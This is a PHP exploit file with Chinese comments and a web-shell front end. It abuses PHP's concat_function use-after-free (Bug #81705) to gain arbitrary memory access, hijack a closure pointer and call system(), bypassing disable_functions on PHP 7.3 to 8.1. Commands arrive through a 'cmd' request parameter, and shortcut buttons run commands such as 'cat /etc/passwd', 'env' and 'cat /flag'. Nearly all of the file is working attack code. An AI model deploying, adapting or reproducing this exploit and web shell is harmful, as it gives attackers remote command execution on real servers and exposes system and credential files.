<?php
/**
 * ================================================================
 *  PHP 7.3 - 8.1 disable_functions Bypass
 *  利用 concat_function 类型混淆/UAF (Bug #81705)
 * ================================================================
 *
 *  原理:
 *    PHP 在执行字符串拼接 (.=) 时，如果右操作数是数组，
 *    会触发 zend_error()。此时若已注册 set_error_handler，
 *    错误处理函数可以在 concat_function 执行中途修改操作数，
 *    造成类型混淆 → UAF → 任意内存读写 → 劫持闭包函数指针
 *    → 调用 zif_system() 绕过 disable_functions
 *
 *  适用: PHP 7.3 - 8.1 全版本 (*nix)
 *  参考: https://bugs.php.net/bug.php?id=81705
 *
 * ================================================================
 */

@error_reporting(0);
@set_time_limit(120);
@ini_set('display_errors', 0);

// ======================== 配置 ========================

// 是否开启详细日志（调试用）
define('DBG', isset($_REQUEST['debug']));

// ======================== Exploit 核心 ========================

class Helper { public $a, $b, $c; }

class ConcatExploit {

    // 堆块大小常量
    // ZEND_DEBUG 编译的 PHP 每个 chunk 多 0x20 字节头部
    const CHUNK_DATA  = 0x60;
    const CHUNK_EXTRA = 0;  // 非 debug 版本为 0，debug 为 0x20
    const CHUNK_SIZE  = self::CHUNK_DATA + self::CHUNK_EXTRA;

    // zend_string 结构: gc(8) + h(8) + len(8) + val[]
    // 分配 STRING_SIZE 字节的字符串正好占满一个 CHUNK_DATA
    const STR_SIZE = self::CHUNK_DATA - 0x18 - 1;

    // HashTable 大小的字符串，用于堆喷
    const HT_SIZE     = 0x118;
    const HT_STR_SIZE = self::HT_SIZE - 0x18 - 1;

    private $abc;         // UAF 后重叠 Helper 对象的字符串
    private $helper;      // 被覆盖的 Helper 对象
    private $abc_addr;    // abc 字符串的堆地址
    private $log = array();

    /**
     * 执行命令
     */
    public function run($cmd) {
        // ---- Step 1: 堆整理 (Heap Grooming) ----
        // 交替分配小/大字符串，让堆分配器产生连续的 chunk
        $groom = array();
        for ($i = 0; $i < 10; $i++) {
            $groom[] = self::salloc(self::STR_SIZE);
            $groom[] = self::salloc(self::HT_STR_SIZE);
        }

        // ---- Step 2: 泄漏堆地址 ----
        $leak = $this->heap_leak();
        $concat_str_addr = self::str2ptr($leak, 16);
        $this->dbg("泄漏 concat_str @ 0x%x", $concat_str_addr);

        // 再分配一块填充，让下一次分配的地址可预测
        $fill = self::salloc(self::STR_SIZE);

        // ---- Step 3: 分配目标字符串 abc ----
        $this->abc = self::salloc(self::STR_SIZE);
        $this->abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->dbg("abc @ 0x%x", $this->abc_addr);

        // ---- Step 4: 释放 abc 的内存 (UAF 核心) ----
        $this->heap_free($this->abc_addr);

        // ---- Step 5: 用 Helper 对象抢占被释放的内存 ----
        $this->helper = new Helper;

        // 验证 UAF 是否成功：abc 字符串现在和 Helper 对象重叠
        // strlen 应该返回一个非常大的值（因为 zend_string.len 被 Helper 的属性覆盖了）
        if (strlen($this->abc) < 0x1337) {
            $this->dbg("UAF 触发失败，strlen(abc) = %d", strlen($this->abc));
            return false;
        }
        $this->dbg("UAF 成功! strlen(abc) = 0x%x", strlen($this->abc));

        // ---- Step 6: 设置 Helper 属性 ----
        // a: 用于任意地址读取（通过 strlen 泄漏）
        // b: 闭包对象，后续劫持其函数指针
        // c: 标记值
        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        // ---- Step 7: 通过重叠读取 Helper 内部结构 ----
        $helper_handlers = $this->rel_read(0);
        $this->dbg("helper->handlers @ 0x%x", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        $this->dbg("closure 对象 @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        $this->dbg("Closure class_entry @ 0x%x", $closure_ce);

        // ---- Step 8: 搜索 basic_functions 模块 ----
        $basic_funcs = $this->find_basic_funcs($closure_ce);
        if (!$basic_funcs) {
            $this->dbg("找不到 basic_functions 模块");
            return false;
        }
        $this->dbg("basic_functions @ 0x%x", $basic_funcs);

        // ---- Step 9: 在 basic_functions 中找 zif_system ----
        $zif_system = $this->find_zif_system($basic_funcs);
        if (!$zif_system) {
            $this->dbg("找不到 zif_system");
            return false;
        }
        $this->dbg("zif_system @ 0x%x", $zif_system);

        // ---- Step 10: 构造 fake closure 劫持执行流 ----
        $fake_off = 0x70;  // 在 abc 字符串中的偏移

        // 复制真实 closure 对象的所有字段
        for ($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_off + $i, $this->read($closure_addr + $i));
        }

        // 修改 type 为 ZEND_INTERNAL_FUNCTION (1)
        // 这样 PHP 会直接调用 handler 指针而不走 opcode 执行
        $this->rel_write($fake_off + 0x38, 1, 4);

        // 覆盖 handler 指针为 zif_system
        // PHP 8.x 的 handler 偏移是 0x70，7.x 是 0x68
        $handler_off = (PHP_MAJOR_VERSION >= 8) ? 0x70 : 0x68;
        $this->rel_write($fake_off + $handler_off, $zif_system);

        // fake closure 的实际地址 = abc 地址 + 偏移 + zend_string 头部(0x18)
        $fake_closure_addr = $this->abc_addr + $fake_off + 0x18;
        $this->dbg("fake closure @ 0x%x", $fake_closure_addr);

        // 将 helper->b 的指针替换为 fake closure
        $this->rel_write(0x20, $fake_closure_addr);

        // ---- Step 11: 触发! ----
        // 调用 helper->b 实际上会执行 zif_system($cmd)
        ($this->helper->b)($cmd);

        // ---- Step 12: 恢复现场，避免 crash ----
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);

        return true;
    }

    /**
     * 利用 concat UAF 泄漏堆内存
     *
     * 当 $arr[1] .= string 执行时：
     *   1. PHP 发现 $arr[1] 是数组元素，尝试拼接
     *   2. 拼接前分配新的 zend_string 用于存储结果
     *   3. 触发 "Array to string conversion" 错误
     *   4. 我们的 error_handler 把 $arr 改成 int，释放了 HashTable
     *   5. 分配 $buf 字符串抢占被释放的 HashTable 内存
     *   6. $buf 中包含了旧 HashTable 的内存数据（含堆指针）
     */
    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;  // 释放数组 → 释放 HashTable 内存
            $buf = str_repeat("\x00", self::HT_STR_SIZE);  // 抢占
        });
        $arr[1] .= self::salloc(self::STR_SIZE - strlen("Array"));
        return $buf;
    }

    /**
     * 利用 concat UAF 释放指定地址的内存
     *
     * 构造一个伪造的 zend_string，其 val 指向目标地址
     * 当 error_handler 触发时，伪造的字符串被释放
     * 实际释放的是我们指定的目标地址
     */
    private function heap_free($addr) {
        // 构造 payload：伪造 zend_string 头部，让 val 指向 $addr
        $payload = pack("Q*",
            0xdeadbeef,  // gc.refcount + gc.type_info
            0xcafebabe,  // h (hash)
            $addr        // len (被当作指针使用)
        );
        $payload .= str_repeat("A", self::HT_STR_SIZE - strlen($payload));

        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);  // 用 payload 填充释放的内存
        });
        $arr[1] .= "x";
    }

    // ---- 内存读写原语 ----

    /**
     * 相对读取：从 abc 字符串的指定偏移读取 8 字节
     */
    private function rel_read($off) {
        return self::str2ptr($this->abc, $off);
    }

    /**
     * 相对写入：向 abc 字符串的指定偏移写入值
     */
    private function rel_write($off, $val, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$off + $i] = chr($val & 0xff);
            $val >>= 8;
        }
    }

    /**
     * 任意地址读取
     *
     * 原理: helper->a 是一个 zend_string 指针
     * 通过 rel_write 修改 abc 中存储的 a 指针，
     * 让它指向 (addr - 0x10)，则 strlen(helper->a) 返回
     * 地址 addr 处的 8 字节值（被解读为字符串长度）
     */
    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $val = strlen($this->helper->a);
        if ($n !== 8) { $val &= (1 << ($n << 3)) - 1; }
        return $val;
    }

    /**
     * 搜索 standard 模块 (包含 basic_functions)
     *
     * 策略:
     *   1. 读 /proc/self/maps 获取 PHP 二进制的可读段范围
     *   2. 在这些段中搜索 zend_module_entry 特征
     *   3. 如果 maps 不可读，从 class_entry 开始大范围暴力搜索
     */
    private function find_basic_funcs($start_addr) {
        $known_apis = array(
            20180731,  // PHP 7.3
            20190902,  // PHP 7.4
            20200930,  // PHP 8.0
            20210902,  // PHP 8.1
        );

        // ---- 策略1: 通过 /proc/self/maps 精确定位 ----
        $maps = @file_get_contents("/proc/self/maps");
        if ($maps) {
            $this->dbg("读取 /proc/self/maps 成功");
            $segments = array();

            foreach (explode("\n", $maps) as $line) {
                if (empty($line)) continue;
                // 只搜索可读的段（r--p 或 rw-p），跳过可执行段
                // standard 模块在数据段 (.data/.bss) 或只读数据段 (.rodata)
                if (!preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+(r[w-])/i', $line, $m)) continue;

                $seg_start = hexdec($m[1]);
                $seg_end   = hexdec($m[2]);
                $seg_size  = $seg_end - $seg_start;

                // 只搜索包含 PHP 相关内容的段
                // 跳过特别大的段（>64MB）和特别小的段（<4KB）
                if ($seg_size > 0x4000000 || $seg_size < 0x1000) continue;

                // 跳过堆和栈区域
                if (strpos($line, '[heap]') !== false || strpos($line, '[stack]') !== false) continue;

                // 优先搜索包含 php/lsphp 关键字的段
                $priority = 0;
                if (preg_match('/php|lsphp|libphp/i', $line)) $priority = 2;
                elseif (strpos($line, '.so') !== false) $priority = 1;

                $segments[] = array($seg_start, $seg_end, $priority, $line);
            }

            // 按优先级排序（PHP相关段优先）
            usort($segments, function($a, $b) { return $b[2] - $a[2]; });

            $searched = 0;
            foreach ($segments as $seg) {
                list($seg_start, $seg_end, $prio, $line) = $seg;

                // 最多搜索 10 个段
                if ($searched >= 10) break;
                $searched++;

                $this->dbg("扫描段: 0x%x-0x%x (prio=%d)", $seg_start, $seg_end, $prio);

                for ($addr = $seg_start; $addr < $seg_end - 0x30; $addr += 0x10) {
                    $size = $this->read($addr, 4);
                    if ($size !== 0xA8) continue;

                    $api = $this->read($addr + 4, 4);
                    if (!in_array($api, $known_apis)) continue;

                    $name_ptr = $this->read($addr + 0x20);
                    if ($name_ptr < 0x10000 || $name_ptr > 0x7fffffffffff) continue;

                    $name_val = $this->read($name_ptr);
                    if ($name_val === 0x647261646e617473) {
                        $this->dbg("standard 模块 @ 0x%x (maps扫描, api=%d)", $addr, $api);
                        return $this->read($addr + 0x28);
                    }
                }
            }
            $this->dbg("maps扫描: 搜索了 %d 个段，未找到", $searched);
        } else {
            $this->dbg("/proc/self/maps 不可读");
        }

        // ---- 策略2: 从 class_entry 暴力搜索（大范围） ----
        // 向下搜索 16MB
        $this->dbg("暴力搜索: 从 0x%x 向下 16MB", $start_addr);
        $addr = $start_addr;
        for ($i = 0; $i < 0x100000; $i++) {
            $addr -= 0x10;
            if ($addr < 0x10000) break;

            $size = $this->read($addr, 4);
            if ($size !== 0xA8) continue;

            $api = $this->read($addr + 4, 4);
            if (!in_array($api, $known_apis)) continue;

            $name_ptr = $this->read($addr + 0x20);
            if ($name_ptr < 0x10000 || $name_ptr > 0x7fffffffffff) continue;

            $name_val = $this->read($name_ptr);
            if ($name_val === 0x647261646e617473) {
                $this->dbg("standard 模块 @ 0x%x (暴力搜索, api=%d)", $addr, $api);
                return $this->read($addr + 0x28);
            }
        }

        // 向上搜索 16MB
        $this->dbg("暴力搜索: 从 0x%x 向上 16MB", $start_addr);
        $addr = $start_addr;
        for ($i = 0; $i < 0x100000; $i++) {
            $addr += 0x10;

            $size = $this->read($addr, 4);
            if ($size !== 0xA8) continue;

            $api = $this->read($addr + 4, 4);
            if (!in_array($api, $known_apis)) continue;

            $name_ptr = $this->read($addr + 0x20);
            if ($name_ptr < 0x10000 || $name_ptr > 0x7fffffffffff) continue;

            $name_val = $this->read($name_ptr);
            if ($name_val === 0x647261646e617473) {
                $this->dbg("standard 模块 @ 0x%x (暴力向上, api=%d)", $addr, $api);
                return $this->read($addr + 0x28);
            }
        }

        return false;
    }

    /**
     * 在 basic_functions 数组中查找 zif_system
     *
     * zend_function_entry 结构:
     *   char *fname       (偏移 0x00)
     *   handler           (偏移 0x08)
     *   arg_info          (偏移 0x10)
     *   num_args          (偏移 0x18)
     *   flags             (偏移 0x1c)
     *
     * 遍历数组直到 fname == NULL
     * 查找 fname == "system" (0x6d6574737973)
     */
    private function find_zif_system($funcs_addr) {
        $addr = $funcs_addr;
        for ($i = 0; $i < 0x2000; $i++) {
            $entry = $this->read($addr);
            if ($entry === 0) break;

            // 读取函数名前 6 字节
            $name = $this->read($entry, 6);
            // "system" = 0x6d6574737973
            if ($name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        }

        return false;
    }

    // ---- 工具函数 ----

    private function dbg($fmt) {
        if (DBG) {
            $args = func_get_args();
            array_shift($args);
            $this->log[] = vsprintf($fmt, $args);
        }
    }

    public function getLog() { return $this->log; }

    static function salloc($size) {
        return str_shuffle(str_repeat("A", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $addr = 0;
        for ($j = $n - 1; $j >= 0; $j--) {
            $addr <<= 8;
            $addr |= ord($str[$p + $j]);
        }
        return $addr;
    }
}

// ======================== Web 界面 ========================

$cmd    = isset($_REQUEST['cmd']) ? trim($_REQUEST['cmd']) : '';
$output = '';
$status = '';
$logs   = array();

if (!empty($cmd)) {
    $tmp = sys_get_temp_dir();
    if (!$tmp || !@is_writable($tmp)) $tmp = '/tmp';
    $out_file = $tmp . '/.cx_' . substr(md5(mt_rand()), 0, 8);

    // 通过重定向捕获命令输出
    $full_cmd = "{$cmd} > {$out_file} 2>&1";

    $exploit = new ConcatExploit();
    $ok = $exploit->run($full_cmd);
    $logs = $exploit->getLog();

    usleep(100000);
    $output = @file_get_contents($out_file);
    @unlink($out_file);

    if ($output !== false && strlen(trim($output)) > 0) {
        $status = 'ok';
    } elseif ($ok) {
        // exploit 执行了但没拿到输出，可能命令本身没输出
        $output = '(命令已执行，无输出)';
        $status = 'warn';
    } else {
        $output = '[!] Exploit 执行失败';
        $status = 'fail';
    }
}

// 环境信息
$php_ver  = PHP_VERSION;
$sapi     = php_sapi_name();
$os       = PHP_OS . ' / ' . (PHP_INT_SIZE == 8 ? 'x86_64' : 'x86');
$server   = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '?';
$uid      = function_exists('posix_getuid') ? posix_getuid() : '?';
$gid      = function_exists('posix_getgid') ? posix_getgid() : '?';
$cwd      = dirname(isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : __FILE__);
$df       = @ini_get('disable_functions');
$basedir  = @ini_get('open_basedir') ?: '(none)';

// 版本兼容性检查
$compat = (PHP_MAJOR_VERSION == 7 && PHP_MINOR_VERSION >= 3) || PHP_MAJOR_VERSION == 8;

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Concat Bypass</title>
<style>
:root {
    --bg: #0a0a0a; --fg: #c8c8c8; --accent: #00ff88;
    --red: #ff4455; --yellow: #ffaa00; --blue: #00aaff;
    --border: #1e1e1e; --surface: #111;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: var(--bg); color: var(--fg);
    font: 13px/1.6 'JetBrains Mono', 'Fira Code', Consolas, monospace;
}
.wrap { max-width: 980px; margin: 0 auto; padding: 16px; }

/* 标题 */
.hd {
    display: flex; align-items: center; gap: 12px;
    padding-bottom: 12px; margin-bottom: 16px;
    border-bottom: 1px solid var(--border);
}
.hd h1 { font-size: 16px; color: var(--accent); font-weight: 600; }
.hd .tag {
    font-size: 10px; padding: 2px 8px; border-radius: 3px;
    background: #0a2a0a; color: var(--accent); border: 1px solid #1a3a1a;
}
.hd .tag.bad { background: #2a0a0a; color: var(--red); border-color: #3a1a1a; }

/* 环境信息 */
.env {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    gap: 1px; background: var(--border); border-radius: 4px;
    overflow: hidden; margin-bottom: 16px; font-size: 11px;
}
.env div { background: var(--surface); padding: 6px 10px; }
.env label { color: #666; margin-right: 6px; }
.env span { color: var(--blue); }

/* 输入 */
.input-row { display: flex; gap: 8px; margin-bottom: 16px; }
.input-row input {
    flex: 1; background: var(--surface); border: 1px solid var(--border);
    color: var(--accent); padding: 10px 14px; font: inherit; font-size: 14px;
    border-radius: 4px; outline: none; transition: border-color .2s;
}
.input-row input:focus { border-color: var(--accent); }
.input-row button {
    background: var(--accent); color: #000; border: none;
    padding: 10px 24px; font: inherit; font-weight: 700;
    border-radius: 4px; cursor: pointer; white-space: nowrap;
}
.input-row button:hover { filter: brightness(0.9); }

/* 快捷命令 */
.shortcuts { margin-bottom: 16px; display: flex; flex-wrap: wrap; gap: 6px; }
.shortcuts a {
    font-size: 11px; padding: 3px 10px; border-radius: 3px;
    background: var(--surface); border: 1px solid var(--border);
    color: var(--fg); text-decoration: none; cursor: pointer;
}
.shortcuts a:hover { border-color: var(--accent); color: var(--accent); }

/* 输出 */
.out-box {
    background: #050505; border: 1px solid var(--border); border-radius: 4px;
    min-height: 280px; max-height: 520px; overflow: auto;
}
.out-hdr {
    padding: 8px 12px; border-bottom: 1px solid var(--border);
    color: #555; font-size: 11px; display: flex; justify-content: space-between;
}
.out-hdr .method { color: var(--accent); }
.out-body { padding: 12px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
.out-body.ok { color: var(--accent); }
.out-body.fail { color: var(--red); }
.out-body.warn { color: var(--yellow); }
.out-body.idle { color: #333; }

/* Debug */
.dbg {
    background: var(--surface); border: 1px solid var(--border); border-radius: 4px;
    padding: 10px; margin-top: 12px; font-size: 10px; color: #555;
    max-height: 180px; overflow: auto;
}
.dbg b { color: #888; }
.dbg .addr { color: var(--blue); }

/* Disable_functions 展示 */
.df-box {
    background: var(--surface); border: 1px solid var(--border); border-radius: 4px;
    padding: 10px; margin-bottom: 16px; font-size: 10px; color: #666;
    max-height: 80px; overflow: auto; word-break: break-all;
}
.df-box label { color: var(--red); font-weight: 600; display: block; margin-bottom: 4px; }
</style>
</head>
<body>
<div class="wrap">

<div class="hd">
    <h1>Concat UAF Bypass</h1>
    <span class="tag <?=$compat?'':'bad'?>">
        PHP <?=$php_ver?> <?=$compat?'Compatible':'NOT SUPPORTED'?>
    </span>
    <span class="tag">Bug #81705</span>
</div>

<div class="env">
    <div><label>PHP</label><span><?=$php_ver?></span></div>
    <div><label>SAPI</label><span><?=$sapi?></span></div>
    <div><label>OS</label><span><?=$os?></span></div>
    <div><label>Server</label><span><?=$server?></span></div>
    <div><label>UID/GID</label><span><?=$uid?>/<?=$gid?></span></div>
    <div><label>CWD</label><span><?=$cwd?></span></div>
</div>

<?php if($df):?>
<div class="df-box">
    <label>disable_functions</label>
    <?=htmlspecialchars($df)?>
</div>
<?php endif;?>

<form method="POST" id="fm">
<input type="hidden" name="debug" value="<?=DBG?'1':'0'?>">
<div class="input-row">
    <input type="text" name="cmd" id="cmd" value="<?=htmlspecialchars($cmd)?>"
           placeholder="输入命令 (如: id, cat /flag, ls -la /)" autofocus>
    <button type="submit">Execute</button>
</div>
</form>

<div class="shortcuts">
<?php
$cmds = array(
    'id', 'whoami', 'uname -a', 'ls -la /', 'cat /etc/passwd',
    'cat /flag', 'find / -name flag* 2>/dev/null', 'env',
    'ls -la /home', 'ps aux', 'ifconfig', 'cat /proc/version',
);
foreach ($cmds as $c):
?>
    <a onclick="document.getElementById('cmd').value='<?=$c?>';document.getElementById('fm').submit();"><?=$c?></a>
<?php endforeach;?>
    <a onclick="location.href='?debug=<?=DBG?'0':'1'?>&cmd='+encodeURIComponent(document.getElementById('cmd').value)"
       style="<?=DBG?'color:var(--accent);border-color:var(--accent)':''?>">
       Debug <?=DBG?'ON':'OFF'?>
    </a>
</div>

<div class="out-box">
    <div class="out-hdr">
        <?php if(!empty($cmd)):?>
        <span>$ <?=htmlspecialchars($cmd)?></span>
        <span class="method">[concat_function UAF]</span>
        <?php else:?>
        <span>Ready</span>
        <?php endif;?>
    </div>
    <div class="out-body <?=$status ?: 'idle'?>">
<?php if(!empty($cmd)):?>
<?=htmlspecialchars($output)?>
<?php else:?>
等待输入命令...

支持 PHP 7.3 / 7.4 / 8.0 / 8.1 全版本
利用 concat_function 类型混淆 + UAF 绕过 disable_functions
<?php endif;?>
    </div>
</div>

<?php if(DBG && !empty($logs)):?>
<div class="dbg">
    <b>Exploit Log:</b><br>
    <?php foreach($logs as $l):?>
    <?=preg_replace('/0x[0-9a-f]+/i', '<span class="addr">$0</span>', htmlspecialchars($l))?><br>
    <?php endforeach;?>
</div>
<?php endif;?>

</div>
</body>
</html>
